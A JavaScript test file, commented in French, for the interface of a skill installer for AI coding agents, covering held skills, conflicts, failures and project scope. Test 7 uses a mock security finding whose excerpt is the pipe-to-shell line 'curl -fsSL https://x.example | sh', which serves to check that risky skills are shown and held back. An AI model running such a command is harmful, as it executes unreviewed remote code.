  ok(t4.srv.installs().length === 0, '6: no target: nothing is sent');
  /* Machine sans lecteur du dossier partagé : la cible n'est pas proposée. */
  const st = baseState(); st.agents = st.agents.filter((a) => !a.universal);
  const t5 = await liveStep4(st);
  ok(!/data-cf-shared/.test(t5.html()), '6: no detected reader: the shared folder is not offered');
  await t5.install();
  ok(JSON.stringify(t5.srv.installs().pop().body.agents) === '["claude-code","windsurf","custom-1"]', '6: no detected reader: own-folder agents only');
  /* Aucun agent : texte vrai en mode réel. */
  const st0 = baseState(); st0.agents.forEach((a) => { a.detected = false; }); st0.agents = st0.agents.filter((a) => !a.custom);
  const t6 = await liveStep4(st0);
  ok(/Aucun agent trouvé/.test(t6.txt()) && !/Quatre signaux/.test(t6.txt()), '6: no agent, live: no demo wording');
}

/* ======================================================= 7. skills retenus par le contrôle, force (constat 10) */
{
  const t = await liveStep4();
  const { SA, srv, picks, m, V, T } = t;
  const [a, b] = picks;
  ok(/contrôle/.test(t.txt()), '7: before installing, the screen says each skill is checked before writing');
  srv.installReply = (body) => ({
    installed: body.items.filter((i) => i.skill === a[1] || (body.force || []).includes(i.skill)).map((i) => i.skill),
    held: body.items.filter((i) => i.skill === b[1] && !(body.force || []).includes(i.skill)).map((i) => ({ name: i.skill, verdict: 'rouge', findings: [{ rule: 'curl-sh', sev: 'high', label: 'Téléchargement suivi d’une exécution', file: 'scripts/run.sh', line: 3, excerpt: 'curl -fsSL https://x.example | sh' }] }))
  });
  await t.install();
  T.flush();
  ok(SA.state.inst.phase !== 'done' && SA.wentTo.length === 0, '7: a held skill does not end as « terminée », no jump to the guide: ' + SA.state.inst.phase);
  ok(SA.state.inst.st[a[0]] === 'done' && SA.state.inst.st[b[0]] === 'held', '7: one installed, one held');
  const h = t.html(), x = text(h);
  clean('7: held', h);
  ok(SA.state.inst && SA.state.inst.st[b[0]] === 'held', '7: rendering keeps the held skill on screen');
  ok(/Motif à risque/.test(x) && !/rouge/.test(x) && !/curl-sh/.test(x), '7: verdict shown in plain words, no internal id');
  ok(/Téléchargement suivi d’une exécution/.test(x) && /scripts\/run\.sh/.test(x) && /ligne 3/.test(x) && h.includes('curl -fsSL https://x.example | sh'), '7: findings of the held skill are shown');
  ok(/Installer malgré l’avertissement/.test(x) && new RegExp('data-cf-force="' + b[0] + '"').test(h), '7: button « Installer malgré l’avertissement »');
  ok(/rien n’a été écrit/i.test(x), '7: the screen says nothing was written for the held skill');
  ok(SA.cart.has(b[0]) && !SA.cart.has(a[0]), '7: the held skill stays in the selection');
  /* Les interrupteurs bougent entre-temps : le renvoi reprend les cibles de la demande d'origine. */
  SA.state.agents.windsurf = false; SA.state.scope = 'projet';
  m.fire('click', el({ 'data-cf-force': b[0] }));
  await tick();
  const p = srv.installs().pop();
  ok(srv.installs().length === 2 && JSON.stringify(p.body) === JSON.stringify({ items: [{ source: b[2], skill: b[1] }], agents: ['shared', 'claude-code', 'windsurf', 'custom-1'], scope: 'global', force: [b[1]] }), '7: resend with force, same targets and scope: ' + JSON.stringify(p.body));
  ok(SA.state.inst.phase === 'done' && SA.state.inst.st[b[0]] === 'done', '7: forced skill installed');
  ok(SA.state.lastInstall.includes(a[0]) && SA.state.lastInstall.includes(b[0]), '7: both skills reach the guide');

  /* Renoncer : « Continuer sans lui » mène au guide avec ce qui est installé. */
  const u = await liveStep4();
  u.srv.installReply = (body) => ({ installed: [u.picks[0][1]], held: [{ name: u.picks[1][1], verdict: 'rouge', findings: [] }] });
  await u.install();
  const acts = u.V.actions();
  const cont = acts.find((x0) => /Continuer sans/.test(x0.label));
  ok(cont && !cont.disabled, '7: « Continuer sans lui » is offered: ' + acts.map((x0) => x0.label).join(' | '));
  cont.on();
  ok(u.SA.wentTo.includes(5) && !u.SA.cart.has(u.picks[1][0]) && u.srv.installs().length === 1, '7: continuing without it opens the guide and sends nothing');
}

/* ======================================================= 8. même nom déjà présent : remplacer ou garder */
{
  const t = await liveStep4();
  const { SA, srv, picks, m } = t;
  const [a, b] = picks;
  srv.installReply = (body) => ({
    installed: body.items.filter((i) => (body.replace || []).includes(i.skill)).map((i) => i.skill),
    conflicts: body.items.filter((i) => !(body.replace || []).includes(i.skill)).map((i) => (i.skill === a[1] ? { name: i.skill, kind: 'manual', src: null } : { name: i.skill, kind: 'other-source', src: 'autre/depot' }))
  });
  await t.install();
  t.T.flush();
  ok(SA.state.inst.phase !== 'done' && SA.wentTo.length === 0, '8: conflicts do not end as « terminée »');
  const h = t.html(), x = text(h);
  clean('8: conflicts', h);
  ok(/Un skill du même nom existe déjà \(copie faite à la main\)/.test(x), '8: hand copy conflict explained');
  ok(/Un skill du même nom existe déjà \(autre source : autre\/depot\)/.test(x), '8: other source conflict explained, with the source');
  ok(!/other-source|manual/.test(x), '8: no internal id shown');
  ok((x.match(/Remplacer \(une sauvegarde est faite\)/g) || []).length === 2 && (x.match(/Garder l’existant/g) || []).length === 2, '8: both choices on each conflict');
  m.fire('click', el({ 'data-cf-replace': a[0] }));
  await tick();
  const p = srv.installs().pop();
  ok(JSON.stringify(p.body) === JSON.stringify({ items: [{ source: a[2], skill: a[1] }], agents: ['shared', 'claude-code', 'windsurf', 'custom-1'], scope: 'global', replace: [a[1]] }), '8: resend with replace: ' + JSON.stringify(p.body));
  ok(SA.state.inst.st[a[0]] === 'done' && SA.state.inst.st[b[0]] === 'conflict', '8: replaced one installed, the other still waits');
  m.fire('click', el({ 'data-cf-keep': b[0] }));
  await tick();
  ok(srv.installs().length === 2, '8: « Garder l’existant » sends nothing');
  ok(SA.state.inst.st[b[0]] === 'kept' && !SA.cart.has(b[0]), '8: kept: out of the selection');
  ok(SA.state.inst.phase === 'done', '8: every decision taken: done');
  ok(/existant gardé/.test(t.txt()), '8: the kept skill says so');
  ok(!SA.state.lastInstall.includes(b[0]) && SA.state.lastInstall.includes(a[0]), '8: only the installed skill reaches the guide');
}

/* ======================================================= 9. échecs par skill, « skipped » et sa raison, relance (constats 6 et 62) */
{
  const t = await liveStep4(undefined, ['find-skills', 'pdf', 'frontend-design']);
  const { SA, srv, picks, V } = t;
  const [a, b, c] = picks;
  srv.installReply = () => ({ installed: [], failed: [{ name: a[1], message: 'Dépôt introuvable sur GitHub.' }, { name: b[1], message: 'Pas de connexion. Vérifiez le réseau.' }], skipped: [{ name: c[1], reason: 'missing-agent-directory' }] });
  await t.install();
  let x = t.txt();
  clean('9: failures', t.html());
  ok(SA.state.inst.phase === 'fail', '9: phase fail');
  ok(/Dépôt introuvable sur GitHub\./.test(x) && /Pas de connexion\. Vérifiez le réseau\./.test(x), '9: each failure shows the server message');
  ok(!/déjà installé/.test(x), '9: a skipped skill is not shown as « déjà installé »');
  ok(/non écrit/i.test(x) && /dossier de l’agent/.test(x) && !/missing-agent-directory/.test(x), '9: skipped shown with its reason, in French: ' + (x.match(/non écrit[^.]*\./i) || [''])[0]);
  ok(!SA.state.lastInstall.includes(c[0]), '9: a skipped skill is not counted as installed');
  /* Sortie de l'impasse : « Continuer » toujours actif, « Réessayer » = échecs encore dans la sélection. */
  let acts = V.actions();
  const cont = acts.find((x0) => /Continuer sans/.test(x0.label)), retry = acts.find((x0) => /Réessayer/.test(x0.label));
  ok(cont && cont.disabled !== true, '9: « Continuer » is active even when nothing was installed');
  ok(new RegExp('data-cart-rm="' + a[0] + '"').test(t.html()), '9: a failed row can be taken out of the selection');
  SA.cart.remove(a[0]);
  srv.installReply = (body) => ({ installed: body.items.map((i) => i.skill) });
  acts = V.actions();
  await acts.find((x0) => /Réessayer/.test(x0.label)).on(); await tick();
  const p = srv.installs().pop();
  ok(JSON.stringify(p.body.items.map((i) => i.skill)) === JSON.stringify([b[1], c[1]]), '9: retry sends what is still in the selection, not the removed skill: ' + JSON.stringify(p.body.items));
  ok(retry && SA.state.inst.phase === 'done', '9: retry succeeds');
  ok(!new RegExp('data-id="' + a[0] + '"').test(t.html()), '9: the removed skill is gone from the list');

  /* Une ligne « skipped » par agent : un skill écrit pour les autres agents reste installé. */
  const v = await liveStep4();
  v.srv.installReply = (body) => ({ installed: body.items.map((i) => i.skill), skipped: [{ name: v.picks[0][1], agent: 'windsurf', reason: 'missing-agent-directory' }] });
  await v.install();
  ok(v.SA.state.inst.phase === 'done' && v.SA.state.inst.st[v.picks[0][0]] === 'done', '9: skipped for one agent but written for others: installed');
  /* Raisons connues et inconnues. */
  const u = await liveStep4();
  u.srv.installReply = () => ({ installed: [], skipped: [{ name: u.picks[0][1], reason: 'identical' }, u.picks[1][1]] });
  await u.install();
  x = u.txt();
  ok(u.SA.state.inst.st[u.picks[0][0]] === 'have' && /déjà installé/.test(x), '9: reason « identical »: déjà installé');
  ok(u.SA.state.inst.st[u.picks[1][0]] !== 'have' && /non écrit/i.test(x), '9: a skipped skill without reason is « non écrit », not « déjà installé »');
  const u2 = await liveStep4();
  u2.srv.installReply = () => ({ installed: [], skipped: [{ name: u2.picks[0][1], reason: 'constructor' }] });
  await u2.install();
  ok(u2.SA.state.inst.st[u2.picks[0][0]] === 'nw' && /Non écrit : le serveur n’a rien écrit/.test(u2.txt()), '9: an inherited key is not a known reason');
  /* Serveur injoignable : message, rien de faussement réussi. */
  const w = await liveStep4();
  w.srv.offline = true;
  await w.install();
  ok(w.SA.state.inst.phase === 'fail' && /serveur local ne répond pas/.test(w.txt()), '9: unreachable server: failure shown');
}

/* ======================================================= 10. « Ce projet seulement » (constat 60) */
{
  const t = await liveStep4();
  const { SA, srv, picks, m, V } = t;
  m.fire('click', el({ 'data-scope': 'projet' }));
  ok(SA.state.scope === 'projet', '10: project scope chosen');
  let h = t.html(), x = text(h);
  clean('10: project scope, no folder', h);
  ok(/<label[^>]*for="cf-proj-dir"[^>]*>Dossier du projet<\/label>/.test(h) && /<input[^>]*id="cf-proj-dir"/.test(h), '10: field « Dossier du projet »');
  ok(/data-cf-proj-set/.test(h), '10: button that sets the folder');
  ok(!x.includes(HOME + '/ailleurs'), '10: the folder where the server was started is not shown as the project');
  let last = V.actions().pop();
  ok(last.disabled === true && /dossier du projet/i.test(last.label), '10: no project folder: install is off and says why: ' + last.label);
  /* Agent ajouté à la main : coupé, avec la raison. */
  ok(/aria-label="Installer dans Mon outil"[^>]*disabled|disabled[^>]*aria-label="Installer dans Mon outil"/.test(h), '10: custom agent switch is off in project scope');
  ok(/installations globales seulement/i.test(x), '10: short reason for the custom agent');
  await t.install();
  ok(srv.installs().length === 0, '10: nothing sent without a project folder');
  /* Dossier refusé : le message du serveur. */
  srv.projectReply = () => ({ status: 400, body: { error: 'BAD_INPUT', message: 'Ce dossier n’existe pas.' } });
  m.fire('input', el({ id: 'cf-proj-dir', value: '/nulle/part' }));
  m.fire('click', el({ 'data-cf-proj-set': '' }));
  await tick();
  let pj = srv.log.filter((e) => e.url === '/api/project').pop();
  ok(pj && pj.method === 'POST' && JSON.stringify(pj.body) === '{"dir":"/nulle/part"}' && pj.token === TOKEN, '10: POST /api/project { dir } through SA.live.call: ' + JSON.stringify(pj && pj.body));
  h = t.html();
  ok(/Ce dossier n’existe pas\./.test(text(h)) && /value="\/nulle\/part"/.test(h), '10: server message shown, typed path kept');
  /* Champ vide : pas d'appel. */
  const n0 = srv.log.length;
  m.fire('input', el({ id: 'cf-proj-dir', value: '   ' }));
  m.fire('click', el({ 'data-cf-proj-set': '' }));
  await tick();
  ok(srv.log.length === n0 && /chemin complet/i.test(t.txt()), '10: empty field: no call, a hint');
  /* Dossier accepté. */
  srv.projectReply = null;
  m.fire('input', el({ id: 'cf-proj-dir', value: '/travail/mon app' }));
  m.fire('click', el({ 'data-cf-proj-set': '' }));
  await tick();
  ok(SA.live.state.project === '/travail/mon app', '10: state holds the project');
  h = t.html(); x = text(h);
  clean('10: project chosen', h);
  ok(x.includes('/travail/mon app') && /data-cf-proj-edit/.test(h) && /Changer de dossier/.test(x), '10: chosen folder shown, with a way to change it');
  ok(!/<input[^>]*id="cf-proj-dir"/.test(h), '10: the field is closed once the folder is set');
  const plan = (h.match(/<pre class="code"[^>]*><code>([\s\S]*?)<\/code><\/pre>/) || ['', ''])[1];
  ok(plan.includes('/travail/mon app/.agents/skills/' + picks[0][1]), '10: plan: shared folder of the project');
  ok(!plan.includes(HOME + '/.claude/skills') && !plan.includes('/opt/mon outil'), '10: plan: no global agent folder, no custom agent');
  last = V.actions().pop();
  ok(!last.disabled && /Installer 2 skills dans 4 agents/.test(last.label), '10: install is on, custom agent not counted: ' + last.label);
  await t.install();
  const p = srv.installs().pop();
  ok(p && JSON.stringify(p.body) === JSON.stringify({ items: picks.map((it) => ({ source: it[2], skill: it[1] })), agents: ['shared', 'claude-code', 'windsurf'], scope: 'project' }), '10: project payload, custom agent left out: ' + JSON.stringify(p && p.body));
  /* Changer de dossier rouvre le champ. */
  const u = await liveStep4({ project: '/travail/premier' });
  u.m.fire('click', el({ 'data-scope': 'projet' }));
  ok(u.txt().includes('/travail/premier') && !/id="cf-proj-dir"/.test(u.html()), '10: project given by the server is shown at once');
  u.m.fire('click', el({ 'data-cf-proj-edit': '' }));
  ok(/<input[^>]*id="cf-proj-dir"[^>]*value="\/travail\/premier"/.test(u.html()), '10: « Changer de dossier » opens the field with the current folder');
  /* Portée globale : l'agent ajouté à la main reste disponible. */
  u.m.fire('click', el({ 'data-scope': 'global' }));
  ok(!/aria-label="Installer dans Mon outil"[^>]*disabled/.test(u.html()), '10: global scope: custom agent switch is on again');
}

/* ======================================================= 11. comptes lus dans l'état réel (constat 28) */
{
  const t = await liveStep4();
  const { SA, srv, picks } = t;
  /* Le serveur rend l'état : les deux skills sont lus par trois agents, pas par les cinq cibles demandées. */
  srv.installReply = (body) => {
    srv.state.mine = body.items.map((i) => ({ id: i.source + '/' + i.skill, name: i.skill, src: i.source, real: true, st: 'ok', on: true, ag: { cursor: 'ok', 'gemini-cli': 'ok', 'claude-code': 'ok' }, chars: 100, warn: 0, note: 80, scan: { verdict: 'vert', findings: [] }, path: HOME + '/.agents/skills/' + i.skill, scope: 'global' }));
    return { installed: body.items.map((i) => i.skill) };
  };
  await t.install();
  ok(/2 skills installés dans 3 agents/.test(t.txt()), '11: « Installation terminée » counts the agents of the returned state: ' + (t.txt().match(/\d+ skills? installés? dans[^.]*/) || [''])[0]);
  SA.state.step = 5;
  ok(/2 skills installés dans 3 agents/.test(text(SA.views.guide.render())), '11: the guide title counts the same agents');
  /* Les interrupteurs changent après coup : les titres ne bougent pas. */
  SA.state.agents.windsurf = false; SA.state.agents['claude-code'] = false;
  ok(/2 skills installés dans 3 agents/.test(text(SA.views.guide.render())), '11: the guide title does not follow the session switches');
  SA.state.route = 'accueil';
  ok(/2 skills dans 3 agents/.test(text(SA.views.accueil.render())), '11: Ma machine counts the agents that hold skills');
  clean('11: guide', SA.views.guide.render()); clean('11: accueil', SA.views.accueil.render());
}
{
  /* Quatre agents détectés, deux skills présents dans un seul. */
  const st = baseState();
  st.mine = ['un', 'deux'].map((n) => ({ id: 'local/' + n, name: n, src: null, real: false, st: 'ng', on: true, ag: { 'claude-code': 'ok' }, chars: 50, warn: 0, note: null, scan: { verdict: 'vert', findings: [] }, path: HOME + '/.claude/skills/' + n, scope: 'global' }));
  const { SA } = load(makeServer(st));
  await SA.live.ready;
  ok(/2 skills dans 1 agent(?!s)/.test(text(SA.views.accueil.render())), '11: fresh load: 2 skills in 1 agent, not in 4: ' + (text(SA.views.accueil.render()).match(/2 skills[^.]{0,30}/) || [''])[0]);
}

/* ======================================================= 12. guide d'un skill hors catalogue (constat 77) */
{
  const st = baseState();
  st.mine = [{ id: 'local/safe-notes', name: 'safe-notes', src: null, real: false, st: 'ng', on: true, ag: { 'claude-code': 'ok' }, chars: 122, warn: 0, note: null, scan: { verdict: 'vert', findings: [] }, path: HOME + '/.claude/skills/safe-notes', scope: 'global' }];
  const { SA } = load(makeServer(st));
  await SA.live.ready;
  let got = '';
  SA.openDrawer = (h) => { got = h; };
  SA.detail.guide('local/safe-notes');
  let x = text(got);
  clean('12: guide outside the catalogue', got);
  ok(/Claude Code/.test(x) && !/Cursor|Gemini CLI|Windsurf|Mon outil/.test(x), '12: only the agents that hold the skill are named: ' + x.slice(0, 200));
  ok(!/copie de la base/.test(x), '12: no sentence about the catalogue for a skill that is not in it');
  ok(x.includes(HOME + '/.claude/skills/safe-notes') && /SKILL\.md/.test(x), '12: says where the description can be read');
  /* Quand le serveur fournit la description, elle est citée. */
  SA.state.mine[0].desc = 'Prend des notes sans rien envoyer.';
  SA.detail.guide('local/safe-notes');
  ok(/Prend des notes sans rien envoyer\./.test(got), '12: the description of the row is quoted when the state has it');
  /* Skill désactivé : aucun agent ne le charge. */
  SA.state.mine[0].on = false;
  SA.detail.guide('local/safe-notes');
  ok(/désactivé/.test(text(got)), '12: a disabled skill says no agent loads it');
}

/* ======================================================= 13. textes : plus de vocabulaire de prototype en mode réel (constats 9, 10 et 48) */
{
  const st = baseState();
  st.mine = [{ id: 'acme/tools/beta', name: 'beta', src: 'acme/tools', real: false, st: 'maj', on: true, ag: { 'claude-code': 'ok' }, chars: 240, warn: 0, note: null, scan: { verdict: 'vert', findings: [] }, path: HOME + '/.agents/skills/beta', scope: 'global' }];
  const srv = makeServer(st);
  const { SA } = load(srv);
  await SA.live.ready;
  stubGo(SA);
  const WORDS = /prototype|à confirmer|fictif|provisoire|reste à établir|Quatre signaux/i;
  const seen = [];
  const look = (label, html) => { seen.push(label); const m = text(html).match(WORDS); ok(!m, '13: ' + label + ' still says « ' + (m && m[0]) + ' »'); clean('13: ' + label, html); };
  /* Mise à jour : rien n'est promis qui n'ait été comparé. */
  SA.state.route = 'accueil';
  const hm = SA.views.accueil.render();
  look('accueil', hm);
  ok(!/sans motif nouveau/.test(text(hm)), '13: live update without a known diff: no « sans motif nouveau »');
  ok(/1 mise à jour disponible/.test(text(hm)) && /contrôlée avant d’être écrite/.test(text(hm)), '13: live update: says the new version is checked before writing');
  /* Détail d'un skill noté sans extrait de fichier. */
  const noFile = Object.keys(SA.search.details).find((id) => !(SA.files || {})[id] && !SA.reco.manual(id));
  look('detail without file', SA.detail.html(noFile));
  ok(/n’est pas dans la copie de la base/.test(text(SA.detail.html(noFile))), '13: detail says the file is not in the copy of the base');
  look('detail with file', SA.detail.html(Object.keys(SA.files)[0]));
  /* Chaque écran du parcours. */
  SA.state.route = 'wizard'; SA.state.step = 1; look('objectif', SA.views.objectif.render());
  SA.state.goal = 'site'; SA.state.step = 2; look('questions', SA.views.questions.render());
  SA.state.answers = { type: 'vitrine', tech: 'next', host: 'vercel', needs: ['design'] }; SA.state.step = 3; SA.state.dbReady = true;
  look('resultats', SA.views.resultats.render());
  SA.state.step = 4; look('confirmation', SA.views.confirmation.render());
  SA.state.inst = { phase: 'run', ids: SA.cart.list().slice(), st: {} }; SA.state.installing = true;
  const run = SA.views.confirmation.render();
  look('confirmation en cours', run);
  ok(/télécharge chaque skill, le contrôle, puis l’écrit/.test(text(run)) && /retenu/.test(text(run)), '13: running text is true and mentions held skills');
  SA.state.installing = false; SA.state.inst = null;
  SA.state.route = 'recherche'; look('recherche', SA.views.recherche.render());
  ok(seen.length >= 9, '13: every screen looked at');
}
{
  /* Démo : « sans motif nouveau » seulement quand la différence a été contrôlée. */
  const { SA } = load();
  SA.initState();
  const withScan = SA.state.mine.filter((r) => r.st === 'maj' && r.diff && r.diff.scan).length, maj = SA.state.mine.filter((r) => r.st === 'maj').length;
  ok(maj > 0 && withScan === maj, '13: demo rows all carry a checked diff');
  ok(/sans motif nouveau/.test(text(SA.views.accueil.render())), '13: demo: « sans motif nouveau » kept when every diff was checked');
  SA.state.mine.filter((r) => r.st === 'maj').forEach((r) => { delete r.diff; });
  ok(!/sans motif nouveau/.test(text(SA.views.accueil.render())), '13: without a checked diff the sentence is gone');
}

/* ======================================================= 14. démo : mêmes règles de cibles, sans serveur */
{
  const { SA } = load();
  SA.initState({ route: 'wizard', step: 4, mine: [] });
  SA.cart.add(idOf(SA, 'find-skills', 'vercel-labs/skills'));
  const m = mount(SA, 'confirmation');
  let h = SA.views.confirmation.render();
  clean('14: demo step 4', h);
  ok(/Dossier partagé/.test(text(h)) && /Lu par Cline/.test(text(h)) && !/Installer dans Cline/.test(h), '14: demo: Cline is the reader of the shared folder');
  let plan = (h.match(/<pre class="code"[^>]*><code>([\s\S]*?)<\/code><\/pre>/) || ['', ''])[1];
  ok(plan.includes('/Users/alex/.agents/skills/find-skills') && /liens?/.test(plan), '14: demo: shared folder and links');
  m.fire('click', el({ 'data-cf-shared': '' }));
  h = SA.views.confirmation.render();
  plan = (h.match(/<pre class="code"[^>]*><code>([\s\S]*?)<\/code><\/pre>/) || ['', ''])[1];
  ok(!plan.includes('/Users/alex/.agents/skills/find-skills') && /copies?/.test(plan) && plan.includes('/Users/alex/.claude/skills/find-skills'), '14: demo: copies when the shared folder is off');
  SA.initState({ route: 'wizard', step: 4, mine: [], scope: 'projet', os: 'win' });
  SA.cart.add(idOf(SA, 'find-skills', 'vercel-labs/skills'));
  h = SA.views.confirmation.render();
  ok(h.includes('C:\\Users\\alex\\code\\mon-app\\.agents\\skills\\find-skills') && !/id="cf-proj-dir"/.test(h), '14: demo, project scope on Windows: example folder, no field');
}

/* ======================================================= 15. volet de droite et fil d'Ariane (constats 17, 24, 28, 49) */
const section = (html, title) => { const m = String(html).match(new RegExp('<h3 class="ds-h">' + title + '[\\s\\S]*?</section>')); return m ? m[0] : ''; };
{
  /* Résumé de l'étape 4 : liens = skills × agents à dossier propre cochés, seulement quand le dossier partagé est écrit. */
  const t = await liveStep4({ agents: baseState().agents.concat([A('cline', 'Cline', { globalDir: HOME + '/.cline/skills' })]) });
  const { SA } = t;
  t.html();
  ok(typeof SA.panelHtml === 'function', '15: the side panel can be read without a page');
  let res = text(section(SA.panelHtml(), 'Résumé'));
  clean('15: summary, shared folder', SA.panelHtml());
  ok(/Agents 6/.test(res), '15: shared folder: agents that will read = 2 readers + 4 own folders: ' + res);
  ok(/Dossiers créés 2/.test(res), '15: shared folder: one folder per skill: ' + res);
  ok(/Liens créés 8 2 × 4/.test(res), '15: shared folder: links = 2 skills × 4 own-folder agents, Cline counted like the others: ' + res);
  t.m.fire('click', el({ 'data-cf-shared': '' }));
  res = text(section(SA.panelHtml(), 'Résumé'));
  ok(/Liens créés 0/.test(res) && !/×[^D]*$/.test(res.replace(/.*Liens créés/, '')), '15: copies: no link: ' + res);
  ok(/Dossiers créés 8 2 × 4/.test(res), '15: copies: one folder per skill and per agent: ' + res);
  ok(/Agents 4/.test(res), '15: copies: the readers of the shared folder are not counted: ' + res);
  /* Agents actifs sur Ma machine : ceux qui ont des skills (Row.ag), jamais les interrupteurs. */
  SA.state.mine = [{ id: 'local/one', name: 'one', src: 'copie manuelle', st: 'ng', on: true, ag: { windsurf: 'ok', cursor: 'div', 'gemini-cli': 'ko', ghost: 'ok' }, path: HOME + '/.codeium/windsurf/skills/one', scope: 'global' }];
  SA.state.agents = { 'claude-code': true };
  for (const route of ['accueil', 'gestion', 'sauvegardes']) {
    SA.state.route = route;
    const ag = text(section(SA.panelHtml(), 'Agents actifs'));
    ok(/Windsurf/.test(ag) && /Cursor/.test(ag) && !/Claude Code/.test(ag) && !/Gemini CLI/.test(ag) && !/ghost/.test(ag), '15: ' + route + ': active agents are the ones holding skills: ' + ag);
  }
  SA.state.mine = [];
  SA.state.route = 'accueil';
  ok(/Aucun agent/.test(text(section(SA.panelHtml(), 'Agents actifs'))), '15: no skill: no active agent');
  /* Recherche : entrée de premier niveau, date et source de la base, jamais « Base en ligne » pour la copie fournie. */
  SA.state.route = 'recherche'; SA.state.dbReady = true;
  const cr = SA.crumbHtml ? SA.crumbHtml() : '';
  ok(/Recherche/.test(text(cr)) && !/Conseil/.test(text(cr)) && text(cr).includes(SA.baseLabel()), '15: search crumb: « Recherche » and the base label: ' + text(cr));
  const pan = SA.panelHtml();
  ok(!/Base en ligne/.test(pan) && text(pan).includes('Base du 12/11/2026 · copie fournie'), '15: search panel: date and source of the base: ' + text(pan).slice(0, 300));
  ok(!/Copie du/.test(text(pan)), '15: search panel: no « Copie du » line');
  const sr = SA.views.recherche.render();
  ok(text(sr).includes(SA.baseLabel()) && !/Base en ligne/.test(sr), '15: search view: the shared base label');
}
{
  /* Une seule page skills.sh par entrée « Installation à la main », un seul badge. */
  const { SA } = load();
  const man = SA.search.items.find((it) => SA.reco.manual(it[0]));
  SA.initState({ route: 'recherche', dbReady: true, mine: [], search: { q: man[1], cat: '', min: 0, off: false, warn: 'tous', sort: 'note', shown: 30 } });
  const sr = SA.views.recherche.render();
  const row = (sr.match(new RegExp('<li class="sr-row"[^>]*>(?:(?!</li>)[\\s\\S])*data-detail="' + man[0].replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '"[\\s\\S]*?</li>')) || [''])[0];
  ok(row, '15: search row of a manual entry found');
  ok((row.match(/href="https:\/\/skills\.sh\//g) || []).length === 1, '15: search: one skills.sh link per manual row: ' + (row.match(/href="https:\/\/skills\.sh\/[^"]*"/g) || []).join(' '));
  ok((row.match(/Installation à la main/g) || []).length === 1, '15: search: one badge per manual row');
  SA.initState({ route: 'wizard', step: 3, goal: 'mobile', answers: { os: 'ios', tech: 'swift', needs: ['design'] }, dbReady: true, mine: [] });
  const html = SA.views.resultats.render();
  const rows = html.split('<li class="rs-row').slice(1).filter((r) => / rs-man/.test(r.slice(0, 80)));
  ok(rows.length > 0, '15: results: at least one manual row');
  ok(rows.every((r) => (r.match(/href="https:\/\/skills\.sh\//g) || []).length === 1 && (r.match(/Installation à la main/g) || []).length === 1), '15: results: one skills.sh link and one badge per manual row');
  SA.state.pv = Object.assign({}, SA.state.pv, { net: 'off' });
  const off = SA.views.resultats.render();
  ok(text(off).includes(SA.baseLabel()) && !/base en ligne/i.test(off), '15: results offline: the shared base label');
}

console.log(`${checks} checks, ${fails} failure(s)`);
process.exit(fails ? 1 : 0);
